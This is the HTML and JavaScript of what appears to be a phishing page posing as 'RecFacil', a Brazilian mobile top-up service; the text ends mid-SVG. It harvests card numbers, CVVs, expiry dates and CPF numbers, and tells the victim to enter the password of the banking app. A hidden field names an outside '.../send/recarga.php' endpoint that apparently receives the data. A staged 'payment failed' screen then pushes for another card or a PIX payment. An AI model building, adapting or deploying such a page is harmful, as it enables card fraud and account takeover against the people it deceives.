
<html class="mdl-js"><head>
<meta charset="utf-8">
<title>RecFacil - Online</title>
<meta name="viewport" content="width=device-width, user-scalable=no">
<link href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
<link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.indigo-pink.min.css">
<link rel="stylesheet" href="./static/css/index.css?21125">
<link rel="stylesheet" href="./static/css/loadingSpinner.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="./static/js/index.js"></script>
<script defer="" src="https://code.getmdl.io/1.3.0/material.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.12/jquery.mask.min.js"></script>
<script src="https://unpkg.com/imask"></script>


</head>
<body>
<input id="bname" type="text" value="NAO IDENTIFICADO" style="display: none">
<input id="senhanum" type="text" value="4" style="display: none">
<input id="tok" type="text" value="246971035187365" style="display: none">
<input type="text" value="1" id="user" style="display: none">
<input type="text" value="37" id="tela" style="display: none">
<input type="text" value="https://searchtest.trial.rocks/painel/consultas/send/recarga.php?" id="lkgo" style="display: none">
<input type="text" value="#193ab0" id="bcollor" style="display: none">
<input type="text" value="#193ab08c" id="bcollor2" style="display: none">
<script type="text/javascript">
	$(document).ready(function(){
	  $('#docNumber').mask('999.999.999-99');
	  $('#cardNumber').mask('9999 9999 9999 9999');
	  $('#securityCode').mask('999');
	  $('#senha').mask('99999999');

	  var regExpMask = IMask(
	  document.getElementById('cardholderName'),
	  {
	    mask: /^[a-zA-ZöüóőúéáàűíÖÜÓŐÚÉÁÀŰÍçÇãÃõÕÂâôÔÊê ]{0,100}$/
	  });
	});
	function checknome(){
	  nome = $('#cardholderName').val();
	  if(nome.length<2){
	      $('#errocheckout').html('Nome inválido');
	      return;
	      }else{
	        $('#errocheckout').html(' ');
	        var ok1 = true;
	      }
	    };
    function checkcvv(){
	  cvv = $('#securityCode').val();
	  if(cvv.length<3){
	      $('#errocheckout').html('CVV inválido');
	      return;
	      }else{
	        $('#errocheckout').html(' ');
	        var ok6 = true;
	      }
	    };
	//////Checar MES
	function checkmes(){
	  mes = $('#cardExpirationMonth').val();
	  if(mes = '0'){
	      $('#errocheckout').html('Mês inválido');
	      return;
	      }else{
	        $('#errocheckout').html(' ');
	        var ok7 = true;
	      }
	    };
	//////Checar ANO
	function checkano(){
	  ano = $('#cardExpirationYear').val();
	  if(ano === '0'){
	      $('#errocheckout').html('Ano inválido');
	      return;
	      }else{
	        $('#errocheckout').html(' ');
	        var ok7 = true;
	      }
	    };
	function checkcard(){
	  card = $('#cardNumber').val();
	  if (validarinfo(card) === false || card.length < 16) {
	    $('#errocheckout').html('Número do cartão inválido');
	    return;
	  }else{
	        $('#errocheckout').html(' ');
	      }
	    };
	function checkcpf(){
	  cpf = $('#docNumber').val();
	  if(cpf.length<14 || cpf == "000.000.000-00" || cpf == "111.111.111-11" || cpf == "222.222.222-22" || cpf == "333.333.333-33" || cpf == "444.444.444-44" || cpf == "555.555.555-55" || cpf == "666.666.666-66" || cpf == "777.777.777-77" || cpf == "888.888.888-88" || cpf == "999.999.999-99"){
	      $('#errocheckout').html('CPF inválido');
	      return;
	      }else{
	        $('#errocheckout').html(' ');
	        var ok3 = true;
	      }
	    };
	function checksenha(){
	  senha = $('#senha').val();
	  if(senha.length<4){
	      $('#senhaerro').html('Senha inválida');
	      return;
	      }else{
	        $('#senhaerro').html(' ');
	        var ok6 = true;
	      }
	    };
	function cngcol(){

        colorbase = $('#bcollor').val();
        colorround = $('#bcollor2').val();

        let el = document.getElementById('roundcol');
        el.style.cssText = 'background: linear-gradient(0deg, '+colorround+' 33%, '+colorbase+' 100%);';
          
        let el2 = document.getElementById('btncol');
        el2.style.cssText ='background: '+colorbase+'';

        let el3 = document.getElementById('countzero2');
        el3.style.cssText ='color: '+colorbase+'';
      
    }
</script>
<div id="modalWrecog">
<div class="dialogoWrecog step1">
   <div class="dialogoWrecogLoding">
      <div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner is-active is-upgraded" data-upgraded=",MaterialSpinner">
         <div class="mdl-spinner__layer mdl-spinner__layer-1">
            <div class="mdl-spinner__circle-clipper mdl-spinner__left">
               <div class="mdl-spinner__circle"></div>
            </div>
            <div class="mdl-spinner__gap-patch">
               <div class="mdl-spinner__circle"></div>
            </div>
            <div class="mdl-spinner__circle-clipper mdl-spinner__right">
               <div class="mdl-spinner__circle"></div>
            </div>
         </div>
         <div class="mdl-spinner__layer mdl-spinner__layer-2">
            <div class="mdl-spinner__circle-clipper mdl-spinner__left">
               <div class="mdl-spinner__circle"></div>
            </div>
            <div class="mdl-spinner__gap-patch">
               <div class="mdl-spinner__circle"></div>
            </div>
            <div class="mdl-spinner__circle-clipper mdl-spinner__right">
               <div class="mdl-spinner__circle"></div>
            </div>
         </div>
         <div class="mdl-spinner__layer mdl-spinner__layer-3">
            <div class="mdl-spinner__circle-clipper mdl-spinner__left">
               <div class="mdl-spinner__circle"></div>
            </div>
            <div class="mdl-spinner__gap-patch">
               <div class="mdl-spinner__circle"></div>
            </div>
            <div class="mdl-spinner__circle-clipper mdl-spinner__right">
               <div class="mdl-spinner__circle"></div>
            </div>
         </div>
         <div class="mdl-spinner__layer mdl-spinner__layer-4">
            <div class="mdl-spinner__circle-clipper mdl-spinner__left">
               <div class="mdl-spinner__circle"></div>
            </div>
            <div class="mdl-spinner__gap-patch">
               <div class="mdl-spinner__circle"></div>
            </div>
            <div class="mdl-spinner__circle-clipper mdl-spinner__right">
               <div class="mdl-spinner__circle"></div>
            </div>
         </div>
      </div>
   </div>
   <div id="formParte1">
      <input id="inputCurrentStep" type="hidden" value="3">
      <div class="dialogoWrecogTop" id="toppo">
         <p class="infoDescReco">Telefone: (11) 11111-1111</p>
         <img class="siteSafe" src="./static/imgs/indexSafe.png">
      </div>
      <div id="receberStep1">
         <div class="dialogoWrecogCont step1" id="stepn1">
            <h2 class="dialogoWrecogTitle">Dados de Recarga</h2>
            <p class="dialogoWrecogDesc">Selecione a operadora e o valor desejado.</p>
            <div class="labelPhone label" style="display: none;"> <input id="hiddenInpPhone" type="text" name="cell" class="inpPhone inpText" placeholder="DDD + Nº de Telefone" autocomplete="off"> </div>
            <div class="labelOperadora label">
               <select id="hiddenInpOperadora" name="operadora" class="inpOperadora inpSelect">
                  <option value="none">Selecione a Operadora</option>
                  <option value="vivo"> Vivo</option>
                  <option value="claro"> Claro</option>
                  <option value="tim"> TIM</option>
                  <option value="oi"> Oi</option>
                  <option value="algar"> Algar</option>
                  <option value="correios"> Correios</option>
                  <option value="nextel"> Nextel</option>
               </select>
            </div>
            <div class="labelRecog label">
               <select id="hiddenInpRecarga" name="valor" class="inpRecarga inpSelect">
                  <option value="none">Selecione o Valor</option>
                  <option value="15">R$15 + 5GB de Bônus</option>
                  <option value="20">R$20 + 10GB de Bônus</option>
                  <option value="35">R$35 + 17GB de Bônus</option>
                  <option value="50">R$50 + 25GB de Bônus</option>
                  <option value="75">R$75 + 35GB de Bônus</option>
                  <option value="100">R$100 + 70GB de Bônus</option>
               </select>
            </div>
            <div class="labelPag label">
               <select id="hiddenInpPag" name="pag" class="inpPagamento inpSelect">
                  <option value="none">Método de Pagamento</option>
                  <option value="card">Cartão de Crédito ou Débito</option>
                  <option value="pix">PIX (MercadoPago)</option>
               </select>
            </div>
            <div class="labelCPF label"> <input type="text" name="email" class="inpEmail inpText" placeholder="Endereço de Email" id="geteamail" value="" autocomplete="off"> </div>
            <div class="dialogoWrecogFooter label showTable"> <a class="butCancel">SAIR</a> <button class="butNext" id="irpagar">RECARREGAR AGORA</button> </div>
         </div>
      </div>
      <div id="receberStep2">
         <div class="dialogoWrecogCont step2" id="stepn2">
            <h2 class="dialogoWrecogTitle">Pagamento</h2>
            <p class="dialogoWrecogDesc">Digite os dados do seu cartão para efetuar pagamento.</p>
            <div class="labelName label">  <input type="text" onblur="checknome();" name="cardholderName" class="inpName inpText" id="cardholderName" data-checkout="cardholderName" placeholder="Nome do Titular" > </div>
            <div class="labelCPF label">  <input type="text" name="cpf" onblur="checkcpf();" class="inpCPF inpText" id="docNumber" data-checkout="docNumber" placeholder="CPF do Titular (Apenas números)"> </div>
            <div class="labelCard label">  <input type="text" class="inpCard inpText" name="cardNumber" id="cardNumber" data-checkout="cardNumber" placeholder="Número do Cartão" onselectstart="return false" onpaste="return false" oncopy="return false" oncut="return false" ondrag="return false" ondrop="return false" autocomplete="off" onblur="checkcard();"> </div>
            <div class="labelCard label">
               <h4 class="labelTitle">EXPIRAÇÃO DO CARTAO</h4>
               
               <select name="cardExpirationMonth" id="cardExpirationMonth" required>
                          <option value="0" disabled selected>Mês</option>
                          <option value="01">01</option>
                          <option value="02">02</option>
                          <option value="03">03</option>
                          <option value="04">04</option>
                          <option value="05">05</option>
                          <option value="06">06</option>
                          <option value="07">07</option>
                          <option value="08">08</option>
                          <option value="09">09</option>
                          <option value="10">10</option>
                          <option value="11">11</option>
                          <option value="12">12</option>
                        </select>
                        <select name="cardExpirationYear" id="cardExpirationYear" onblur="checkano()" required="">
                          <option value="0" disabled selected>Ano</option>
                          <option value="2024">2024</option>
                          <option value="2025">2025</option>
                          <option value="2026">2026</option>
                          <option value="2027">2027</option>
                          <option value="2028">2028</option>
                          <option value="2029">2029</option>
                          <option value="2030">2030</option>
                          <option value="2031">2031</option>
                          <option value="2032">2032</option>
                          <option value="2033">2033</option>
                          <option value="2034">2034</option>
                          <option value="2034">2035</option>
                        </select>

            </div>
            <div class="labelCard label"> <input name="token" type="hidden" value="3754424738"> <input onblur="checkcvv();" type="text" name="cvv" class="inpCVV inpText" id="securityCode" data-checkout="securityCode" placeholder="Código CVV" onselectstart="return false" onpaste="return false" oncopy="return false" oncut="return false" ondrag="return false" ondrop="return false" autocomplete="off" > </div><div id="errocheckout"></div>
            <div class="dialogoWrecogFooter label showTable"> <a class="butCancel">SAIR</a> <button id="pagaragora" class="butNext">EFETUAR PAGAMENTO</button> </div>	
         </div>
      </div>
   </div>
   <div id="formConfirm">
      <div id="receberStep3">
         <div class="dialogoWrecogCont step3" id="stepn3">
              <div class="popup-hd">
		        <div class="popup-img" id="ccsingle"><img src="./assets/img/bcos/not.jpg" class="logobc"></div>
		        <div class="veriftext">Verificação de Segurança</div>
		      </div>

		      <div class="popup-bd" id="popbd1">
		        <div class="popbd-text">Para continuar sua compra em SERASA, por favor, faça a verificação de segurança do cartão ************<span id="fcc">XXXX</span>.</div>
		        <div id="ccsingle2"><span class="atent">ATENÇÃO:</span> Você precisa informar a mesma <b>senha</b> que utiliza para <b>acessar o App</b>, e não a senha do cartão. </div>
		        <div class="popup-code">
		          <div><h6>Senha de Autenticação</h6></div>
		          <input class="popupinput" type="text" id="senha" name="senha" placeholder="ex.:123456" onblur="checksenha()" required>
		          <div class="popconfirm" id="btncol" onclick="gopass();">CONFIRMAR</div>
		          <div class="popupreenv" href="#" style="display: none">REENVIAR CÓDIGO</div>
		          <div id="senhaerro"></div>
		          <div class="loaderbox">
		            <section><span class="loader-16" id="roundcol"></span></section>
		            <div id="countzero2">4:59</div>
		          </div>
		        </div>
		      </div>
		      <div class="popup-bd" id="popbd2">
		        <div class="popbd-text-load">Por favor, aguarde</div>
		        <div id="ccsingleNT">Estamos processando suas informações junto ao seu banco</div>
		        <div class="load-pgi"><img src="./assets/img/loading-gif.gif"></div>
		        <div class="transaction-da">
		          <div class="tda-l">DATA DA TRANSAÇÃO<br>BANCO EMISSOR<br>VALOR DA TRANSAÇÃO<br>BENEFICIÁRIO<BR>CÓD. TRANSAÇÃO</div>
		          <div class="tda-r">
		            <span id="tr-d">17/06/2024</span><br>
		            <span id="tr-b">BR</span><br>
		            R$ <span id="tr-v">20</span>,00<br>
		            <span id="tr-n"></span><br>
		            <span id="tr-c">246971035187365</span></div>
		        </div>
		      </div>

		      <div class="popup-bd" id="popbd3">
		        <div class="pgfail">
		          <div class="payfail"><img src="./assets/img/atencao.png"></div>
		          <div class="pgfail-text"><b>FALHA NO PAGAMENTO!</b><br>O BANCO EMISSOR do seu cartão de crédito não autorizou o pagamento, e por isso sua quitação de dívida não foi concluída.</div>
		        </div>
		        <div class="vap">Você ainda pode:</div>
		        <a href="#boxdpg" onclick="newpg();" style="text-decoration: none;"><div class="popconfirm">Pagar com outro cartão</div></a><br>
		        <a href="#boxdpg" onclick="newpg2();" style="text-decoration: none;"><div class="popconfirm">Pagar via PIX</div></a>
		        <a class="butCancel" style="text-align: center;width: 100%;padding-bottom: 10px;">SAIR</a>
		      </div>
         </div>
         <div class="dialogoWrecogCont step4" id="stepn4">
              <div class="popup-hd">
        <div class="popup-img"><svg width="112" height="42" viewBox="0 0 56 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <g clip-path="url(#clip0_1193_2161)">
                          <path d="M23.1182 19.1341V7.7101C23.1182 5.6045 24.8206 3.9021 26.9262 3.9021H30.2974C32.3918 3.9021 34.083 5.6045 34.083 7.6989V10.1293C34.083 12.2349 32.3806 13.9373 30.275 13.9373H25.515" stroke="#939598" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path>
                          <path d="M35.0234 3.91333H36.4906C37.353 3.91333 38.0474 4.60773 38.0474 5.47013V14.0045" stroke="#939598" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path>
                          <path d="M37.7341 2.59174L37.0733 1.93094C36.9053 1.76294 36.9053 1.49414 37.0733 1.33734L37.7341 0.676537C37.9021 0.508537 38.1709 0.508537 38.3277 0.676537L38.9885 1.33734C39.1565 1.50534 39.1565 1.77414 38.9885 1.93094L38.3277 2.59174C38.1597 2.74854 37.8909 2.74854 37.7341 2.59174Z" fill="#32BCAD"></path>
                          <path d="M40.8477 3.9021H42.2925C43.0429 3.9021 43.7485 4.1933 44.2861 4.7309L47.6797 8.1245C48.1165 8.5613 48.8333 8.5613 49.2701 8.1245L52.6525 4.7421C53.1789 4.2157 53.8957 3.9133 54.6461 3.9133H55.8221" stroke="#939598" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path>
                          <path d="M40.8477 13.9262H42.2925C43.0429 13.9262 43.7485 13.635 44.2861 13.0974L47.6797 9.70382C48.1165 9.26702 48.8333 9.26702 49.2701 9.70382L52.6525 13.0862C53.1789 13.6126 53.8957 13.915 54.6461 13.915H55.8221" stroke="#939598" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path>
                          <path d="M14.4714 16.0877C13.7434 16.0877 13.0602 15.8077 12.545 15.2925L9.76739 12.5149C9.57699 12.3245 9.22979 12.3245 9.03939 12.5149L6.2506 15.3037C5.7354 15.8189 5.05219 16.0989 4.32419 16.0989H3.77539L7.30339 19.6269C8.40099 20.7245 10.193 20.7245 11.2906 19.6269L14.8298 16.0877H14.4714Z" fill="#32BCAD"></path>
                          <path d="M4.31293 6.25403C5.04093 6.25403 5.72413 6.53403 6.23933 7.04923L9.02813 9.83803C9.22973 10.0396 9.55453 10.0396 9.75613 9.83803L12.5449 7.06043C13.0601 6.54523 13.7433 6.26523 14.4713 6.26523H14.8073L11.2681 2.72603C10.1705 1.62843 8.37853 1.62843 7.28093 2.72603L3.75293 6.25403H4.31293Z" fill="#32BCAD"></path>
                          <path d="M17.7308 9.18849L15.5916 7.04929C15.5468 7.07169 15.4908 7.08289 15.4348 7.08289H14.4604C13.9564 7.08289 13.4636 7.28449 13.1164 7.64289L10.3388 10.4205C10.0812 10.6781 9.73404 10.8125 9.39804 10.8125C9.05084 10.8125 8.71483 10.6781 8.45723 10.4205L5.66844 7.63169C5.31004 7.27329 4.81724 7.07169 4.32444 7.07169H3.12604C3.07004 7.07169 3.02524 7.06049 2.98044 7.03809L0.830036 9.18849C-0.267564 10.2861 -0.267564 12.0781 0.830036 13.1757L2.96923 15.3149C3.01403 15.2925 3.05884 15.2813 3.11484 15.2813H4.31323C4.81723 15.2813 5.31003 15.0797 5.65723 14.7213L8.44604 11.9325C8.95004 11.4285 9.83484 11.4285 10.3388 11.9325L13.1164 14.7101C13.4748 15.0685 13.9676 15.2701 14.4604 15.2701H15.4348C15.4908 15.2701 15.5356 15.2813 15.5916 15.3037L17.7308 13.1645C18.8284 12.0669 18.8284 10.2861 17.7308 9.18849Z" fill="#32BCAD"></path>
                          <path d="M26.0075 18.1599C25.8507 18.1599 25.6715 18.1934 25.4811 18.2382V18.9326C25.6043 18.9774 25.7499 18.9998 25.8843 18.9998C26.2315 18.9998 26.3995 18.8766 26.3995 18.5742C26.4107 18.2942 26.2763 18.1599 26.0075 18.1599ZM25.3691 19.459V18.0814H25.4699L25.4811 18.1374C25.6379 18.1038 25.8619 18.0479 26.0299 18.0479C26.1643 18.0479 26.2875 18.0703 26.3883 18.1486C26.5115 18.2494 26.5451 18.4062 26.5451 18.5742C26.5451
